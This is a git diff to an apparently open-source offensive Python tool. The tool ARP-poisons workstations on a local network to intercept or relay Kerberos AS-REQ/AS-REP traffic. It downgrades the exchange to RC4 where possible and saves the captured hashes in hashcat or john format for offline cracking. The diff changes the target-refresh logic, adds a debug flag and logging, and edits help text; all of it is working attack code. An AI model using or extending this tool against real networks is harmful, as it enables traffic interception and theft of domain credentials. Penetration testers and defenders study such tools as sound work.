@@ -19,7 +19,6 @@ import socket
 import asyncio
 import logging
 
-logging.basicConfig(level=logging.INFO)
 
 decoder = asn1.Decoder()
 stop_arp_spoofing_flag = threading.Event()
@@ -110,17 +109,16 @@ def restore_listenmode(dic_mac_addresses):
         send(packet, verbose = False, count=1)
 
 
-# def relaymode_arp_spoof(spoofed_ip):
-#     while not stop_arp_spoofing_flag.is_set() and Targets != set():
-#         send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
-#         time.sleep(1)
-
 def update_uphosts():
     mac_addresses = get_all_mac_addresses()
     new_hosts = set(mac_addresses.keys()) - {gw, my_ip} - Targets
     old_hosts = Targets - set(mac_addresses.keys())
-    Targets.update(new_hosts)
-    Targets.difference_update(new_hosts)
+    logging.debug(f'[*] Net probe check, removing down hosts from targets : {list(old_hosts)}')
+    if keep_spoofing : 
+        Targets.update(new_hosts)
+        logging.debug(f'[*] Net probe check, adding new hosts to targets : {list(new_hosts)}')
+    Targets.difference_update(old_hosts)
+    logging.debug(f'[*] Net probe check, updated targets list : {list(Targets)}')
 
 
 def relaymode_arp_spoof(spoofed_ip):
@@ -129,7 +127,7 @@ def relaymode_arp_spoof(spoofed_ip):
         send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
         time.sleep(1)
         timer += 1
-        if net_probe and timer == 7 :
+        if timer == 5 :
             update_uphosts()
             timer = 0
 
@@ -287,7 +285,7 @@ def display_banner():
   / ____ \ ____) | | \ \  __/ |_) | |___| (_| | || (__| | | |  __/ |   
  /_/    \_\_____/|_|  \_\___| .__/ \_____\__,_|\__\___|_| |_|\___|_|   
                             | |                                        
-                            |_|                                          
+                            |_|                                          - by Yassine OUKESSOU
 
 
                             """)
@@ -301,19 +299,19 @@ if __name__ == '__main__':
 
     parser.add_argument('mode', choices=['relay', 'listen'], action='store', help="Relay mode  : AS-REQ requests are relayed to capture AS-REP. Force clients to use RC4 if supported.\n"
                                                                                     "Listen mode : AS-REP packets going to clients are sniffed. No alteration of packets is performed.")
-    parser.add_argument('-outfile', action='store', help='Output filename to write hashes to crack')
-    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REP hashes. Default is hashcat')
-
+    parser.add_argument('-outfile', action='store', help='Output filename to write hashes to crack.')
+    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REP hashes. Default is hashcat.')
+    parser.add_argument('-debug', action='store_true', default=False, help='Increase verbosity')
 
     group = parser.add_argument_group('ARP poisoning')
 
-    group.add_argument('-t', action='store', metavar = "Client workstations", help='Comma separated list of client computers IP addresses or subnet (IP/mask). In relay mode they will be poisoned. In listen mode, the AS-REP directed to them are captured. Default is whole subnet')
-    group.add_argument('-tf', action='store', help='File containing client workstations IP addresses')
-    group.add_argument('-gw', action='store', help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. In listen mode, only this IP\'s ARP cache is poisoned. Default is default interface\'s gateway')
+    group.add_argument('-t', action='store', metavar = "Client workstations", help='Comma separated list of client computers IP addresses or subnet (IP/mask). In relay mode they will be poisoned. In listen mode, the AS-REP directed to them are captured. Default is whole subnet.')
+    group.add_argument('-tf', action='store', help='File containing client workstations IP addresses.')
+    group.add_argument('-gw', action='store', help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. In listen mode, only this IP\'s ARP cache is poisoned. Default is default interface\'s gateway.')
     parser.add_argument('-dc', action='store', help='Domain controller\'s IP.')
-    parser.add_argument('-iface', action='store', help='Interface to use. Uses default interface if not specified')
-    group.add_argument('--keep-spoofing', action='store_true', default=False, help='Keeps poisoning the targets after capturing AS-REP packets. False by default')
-    group.add_argument('--disable-spoofing', action='store_true', default=False, help='Disables arp spoofing, the MitM position is attained by the attacker using their own method, compatible with mitm6. False by default : the tool uses its own arp spoofing method')
+    parser.add_argument('-iface', action='store', help='Interface to use. Uses default interface if not specified.')
+    group.add_argument('--keep-spoofing', action='store_true', default=False, help='Keeps poisoning the targets after capturing AS-REP packets. False by default.')
+    group.add_argument('--disable-spoofing', action='store_true', default=False, help='Disables arp spoofing, the MitM position is attained by the attacker using their own method. False by default : the tool uses its own arp spoofing method.')
 
     if len(sys.argv)==1:
         display_banner()
@@ -325,6 +323,7 @@ if __name__ == '__main__':
     if parameters.keep_spoofing == True and parameters.disable_spoofing == True :
         logging.error('[!] Cannot use --keep-spoofing and --disable-spoofing at the same time')
         sys.exit(1)
+
 
 
     if parameters.t is not None and parameters.tf is not None :
@@ -340,6 +339,12 @@ if __name__ == '__main__':
     disable_spoofing = parameters.disable_spoofing
     gw = parameters.gw if parameters.gw is not None else conf.route.route("0.0.0.0")[2]
     dc = parameters.dc
+    debug = parameters.debug
+
+    if debug :
+        logging.basicConfig(level=logging.DEBUG)
+    else :
+        logging.basicConfig(level=logging.INFO)
 
     if parameters.mode == 'relay' and parameters.dc is None :
         logging.error('[!] Must specify DC IP in relay mode. Quitting...')
@@ -365,7 +370,6 @@ if __name__ == '__main__':
     logging.info(f'[*] Interface : {iface}')
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     logging.info('[*] Enabled IPV4 forwarding')
-    net_probe = False
 
     if not disable_spoofing :
         if parameters.t is not None :
@@ -394,7 +398,6 @@ if __name__ == '__main__':
             TargetsList = [str(ip) for ip in subnet.hosts()]
             TargetsList.remove(gw)
             logging.info(f'[*] Targets not supplied, will use local subnet {subnet} minus the gateway')
-            if keep_spoofing : net_probe = True
 
         if gw in TargetsList and (parameters.t is not None or parameters.tf is not None) :
             logging.info('[*] Found gateway in targets list. Removing it')
@@ -425,6 +428,7 @@ if __name__ == '__main__':
             thread.start()
 
         logging.info('[+] Started ARP spoofing')
+        logging.debug(f'[*] Net probe check, targets list : {list(Targets)}')
     else :
         logging.warning(f'[!] ARP spoofing disabled')
 
